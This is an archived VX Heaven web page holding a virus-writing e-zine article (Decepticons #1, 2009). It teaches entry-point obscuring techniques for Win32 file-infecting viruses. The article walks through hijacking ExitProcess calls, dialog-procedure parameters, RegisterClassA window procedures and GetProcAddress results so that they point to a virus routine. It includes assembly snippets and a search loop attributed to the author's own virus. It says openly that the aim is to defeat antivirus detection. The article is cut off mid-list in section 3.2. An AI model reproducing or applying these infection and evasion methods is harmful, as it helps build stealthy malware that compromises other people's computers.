<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Tiberio Degano 'Easy To Infect Hard to Detect' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Tiberio Degano"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Tiberio Degano,Easy To Infect Hard to Detect, dword, push, call, word, detect, null, pointer, virus, bytes, idea, mistfall, proc, trick, easy, disassemble"/>
<meta name="Description" content="This article taking about EPO. Many VXers don't care so much with EPO even (as I think) it's the most strong idea in the world of virus writing. The benefit of EPO that it doesn't have an One-Click-detect technique to detect it. The polymorphic engines become an easy thing for all emulators and also metamorphic. The truth that you should know that polymorphic engines now become useless against emulators."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"72f9d5cec4abf769d53a31b7b429cf968902c0c8-1498756147-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vtd00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Easy To Infect Hard to Detect</h1><p><a href="/lib/?lang=en&amp;author=Tiberio%20Degano"> Tiberio Degano</a><br/> <em><a href="/vx.php?fid=1904#f1904">Decepticons #1</a></em><br/> <em>December 2009</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vtd00.html';</script><div class="ci"><a href="/lib/?ci=vtd00">2</a></div>[<a style="" href="/lib/?lang=EN&amp;index=VT#vtd00">Back to index</a>] [<a href="/lib/vtd00.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">1. Introduction</a></li>
<li><a href="#c2">2. Griyo EPO</a>
<ul>
<li><a href="#c21">2.1 Advanced Griyo EPO</a></li>
</ul></li>
<li><a href="#c3">3. Parameter Infection EPO</a>
<ul>
<li><a href="#c31">3.1 Advanced Parameter Infection EPO</a></li>
<li><a href="#c32">3.2 GetProcAddress EPO</a></li>
</ul></li>
<li><a href="#c4">4. Static Blocks of Code EPO</a>
<ul>
<li><a href="#c41">4.1 Cavity EPO</a></li>
<li><a href="#c42">4.2 Switches EPO</a></li>
<li><a href="#c43">4.3 Security Check Cookie EPO</a></li>
</ul></li>
<li><a href="#c5">5. Dynamic Blocks of Code EPO</a></li>
<li><a href="#c6">6. Mistfall EPO</a></li>
<li><a href="#c7">7. Conclusion</a></li>
</ul>
<h2><a name="c1"></a>1. Introduction</h2>
<p>Hi everyone I'm Tibero Degano</p>
<p>This article taking about EPO. Many VXers don't care so much with EPO even (as I think) it's the most strong idea in the world of virus writing. The benefit of EPO that it doesn't have an One-Click-detect technique to detect it. The polymorphic engines become an easy thing for all emulators and also metamorphic. The truth that you should know that polymorphic engines now become useless against emulators.</p>
<p>The difference in EPO is in every type of EPO there's a code to detect it, Reverse it or try to trace the virus EPO routine to bypass it. No way to detect all types of EPO by just one technique. Any new EPO mean a new problem.</p>
<p>See MistFall engine how it become very famous and become the most complex virus ever seen and the First metamorphic virus or the most complex metamorphic virus (MetaPHOR) didn't make a huge problem to Avers. Do you know why? Because Mistfall is an irreversible EPO.</p>
<p>EPO include many new ideas and you can call EPO an Art of creativity only it. Not only that but also it's easy to code. it's really "Easy to Infect Hard to Detect".</p>
<p>I'll now take you for a journey to the world of EPO begins with Griyo EPO until reach MistFall with some new ideas.</p>
<p>Now let's begin.</p>
<h2><a name="c2"></a>2. Griyo EPO</h2>
<p>Griyo EPO. Who don't know about Griyo EPO. Most of virus writers use this idea and I think all Avers get bored from it</p>
<p>It simply search for Call to an API and convert it to call to the virus like this</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">Call</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span>kernel32<span style="color: #339933;">.</span>ExitProcess<span style="color: black;">&#93;</span><br/>
&nbsp;</div>
<p>And this will be converted to</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">Call</span>&nbsp; &nbsp; Virus_Routine<br/>
&nbsp;</div>
<p>Most of Virus Writers use this idea with ExitProcess to make the virus resident in the memory and to have the ability to use the data section in their poly</p>
<h3><a name="c21"></a>2.1 Advanced Griyo EPO</h3>
<p>Griyo EPO was modified from a long time and make it more easier. They search for a call to any procedure in the host begin with <code>push ebp/mov ebp,esp</code></p>
<p>I think you know them very well so let's jump to the new ideas</p>
<h2><a name="c3"></a>3. Parameter Infection EPO:</h2>
<p>In this EPO we will not modify the destination of any call to API but we will modify a parameter to this API. it's a simple trick but it's new completely new</p>
<p>This is an Example</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; /lParam = NULL;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; notepad<span style="color: #339933;">.</span>009F654F&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; |DlgProc=notepad.009F654F</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>9FA020<span style="color: black;">&#93;</span> &nbsp; <span style="color: black; font-style: italic;">; |hOwner = NULL</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; 0E &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; |pTemplate = E</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>9FA080<span style="color: black;">&#93;</span> &nbsp; <span style="color: black; font-style: italic;">; |hInst = NULL</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>&lt;&amp;USER32<span style="color: #339933;">.</span>DialogBoxParamW&gt;<span style="color: black; font-style: italic;">; \DialogBoxParamW</span><br/>
&nbsp;</div>
<p>This code will be converted to:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; /lParam = NULL;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; Virus_Routine &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; |DlgProc=***Virus_Routine***</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>9FA020<span style="color: black;">&#93;</span> &nbsp; <span style="color: black; font-style: italic;">; |hOwner = NULL</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; 0E&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; |pTemplate = E</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>9FA080<span style="color: black;">&#93;</span> &nbsp; <span style="color: black; font-style: italic;">; |hInst = NULL</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>&lt;&amp;USER32<span style="color: #339933;">.</span>DialogBoxParamW&gt;<span style="color: black; font-style: italic;">; \DialogBoxParamW</span><br/>
&nbsp;</div>
<p>If you notice we change the parameter (DlgProc) to the virus code make it run the virus as a Dialog Proc</p>
<p>We can at the end of the virus call to real Proc by using this code</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; Invoke&nbsp; SetWindowLongA hWnd<span style="color: #339933;">,</span> GWL_DlgProc<span style="color: #339933;">,</span> 009F654F<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Invoke&nbsp; callwindowProcA hwnd<span style="color: #339933;">,</span>wMsg<span style="color: #339933;">,</span>wParam<span style="color: #339933;">,</span>lParam<br/>
&nbsp;</div>
<p>Don't worry about hWnd and others you will find them on the stack as parameters you can get them easily with no problem</p>
<p>This trick is new and no one think about it. It's not really better maybe more weak but the problem of virus writers that they don't create new EPOs all use Griyo EPO only no thinking about any new Idea</p>
<p>This trick could be used also with CreateWindowHookEx or CallWindowProcA or SetWindowLong GWL_Proc and so on</p>
<p>This trick is easier to be found as they should search for the API and check for their parameters if any of them point to last section or outside code section</p>
<p>We still in the beginning let's go to the second</p>
<h3><a name="c31"></a>3.1 Advanced Parameter Infection EPO</h3>
<p>We want to go a bit harder and found another API could make the detection harder. We will use RegisterClassA and search for WndProc and change it</p>
<p>RegisterClassA is an API used to set the information of a window you want to create like it's icon, it's cursor and so on.. One of these information is The Window Proc. This is a Proc started with <code>Push ebp/mov ebp,esp</code> and the pointer to it is a pointer inside code section like this:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">-</span><span style="color: #ff0000;">64</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>EES<span style="color: #339933;">.</span>0043351C&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;the Proc that we want</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">LEA</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">-</span><span style="color: #ff0000;">40</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">-</span><span style="color: #ff0000;">44</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">LEA</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">-</span><span style="color: #ff0000;">68</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; pWndClass</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; &lt;<span style="color: #00007f; font-weight: bold;">JMP</span><span style="color: #339933;">.</span>&amp;user32<span style="color: #339933;">.</span>RegisterClassA&gt;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; RegisterClassA</span><br/>
&nbsp;</div>
<p>If you see in the first line the author of this program start to write the information of Window Proc if we change this code to</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">-</span><span style="color: #ff0000;">64</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>Virus_Routine &nbsp; &nbsp; <span style="color: black; font-style: italic;">;the Proc that we want</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">LEA</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">-</span><span style="color: #ff0000;">40</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">-</span><span style="color: #ff0000;">44</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">LEA</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">-</span><span style="color: #ff0000;">68</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; pWndClass</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; &lt;<span style="color: #00007f; font-weight: bold;">JMP</span><span style="color: #339933;">.</span>&amp;user32<span style="color: #339933;">.</span>RegisterClassA&gt;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; RegisterClassA</span><br/>
&nbsp;</div>
<p>We will make the virus run when CreateWindowEx called. We make our virus as the Window Procedure of this Window which he tries to register</p>
<p>I know I describe everything fast that's because this article is long and there are still some techniques I want to describe so if you don't understand something tries to read again and again to understand</p>
<p>You will see this technique wri en n my virus Win32.Skipo hope you like it. The code will be easy. it will search for a call to RegisterClassA and search in 50 bytes before it for a pointer to code section and when you follow it you find <code>push ebp/mov ebp,esp</code></p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; SearchForRegisterClass<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if !<span style="color: black;">&#40;</span><span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; found</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">50</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;50 bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;the pointer to the call</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">50</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;make it begin eax-50</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>while <span style="color: #46aa03; font-weight: bold;">ecx</span>&gt;<span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; FindPointerinCodeSection<span style="color: black; font-style: italic;">;is it a pointer</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if !<span style="color: black;">&#40;</span><span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;found</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;push ebp mov ebp,esp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span>==<span style="color: #ff0000;">55h</span> &amp;&amp; <span style="color: #0000ff; font-weight: bold;">word</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span>==8BEC<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; FoundPointer<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endw<br/>
&nbsp;</div>
<p>That's just an example on how to use this technique to hide the virus pointer</p>
<h3><a name="c32"></a>3.2 GetProcAddress EPO</h3>
<p>Another way you can use an advanced technique to hide the pointer. This technique maybe need a disassembler to work fine</p>
<p>If you see this code:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; EES<span style="color: #339933;">.</span>00425DEC&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; /pModule = &quot;comctl32.dll&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; &lt;<span style="color: #00007f; font-weight: bold;">JMP</span><span style="color: #339933;">.</span>&amp;kernel32<span style="color: #339933;">.</span>GetModuleHandleA&gt;<span style="color: black; font-style: italic;">; \GetModuleHandleA</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EBX</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">TEST</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EBX</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EBX</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">JE</span>&nbsp; &nbsp; &nbsp; EES<span style="color: #339933;">.</span>00425DE6<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; EES<span style="color: #339933;">.</span>00425DFC&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; / &quot;InitializeFlatSB&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EBX</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; |hModule</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; &lt;<span style="color: #00007f; font-weight: bold;">JMP</span><span style="color: #339933;">.</span>&amp;kernel32<span style="color: #339933;">.</span>GetProcAddress&gt;&nbsp; <span style="color: black; font-style: italic;">; \GetProcAddress</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">755730</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
&nbsp;</div>
<p>This code is simply get the module base of a Dll and tries to get Address of an API in it. Is this code is common? Yeah very common with also LoadLibraryA</p>
<p>If you see the last line of this code you will see it saves the address in 755730. If we can save our Virus_Routine in it and delete this code. This will be fine. To modify it we need to</p>
<ol>
<li>Search for GetModuleHandleA or LoadLibraryA and search in the pushes for a string end with ".dll"</li>
<li>after that we need to search for disassemble for 50 bytes searching for GetProcAddressA. If we find it save the pointer to the API and then disassemble the next line and</li>
<li>if the next line try to save eax in an Address we will delete GetProcAddress and all its parameters and change it into
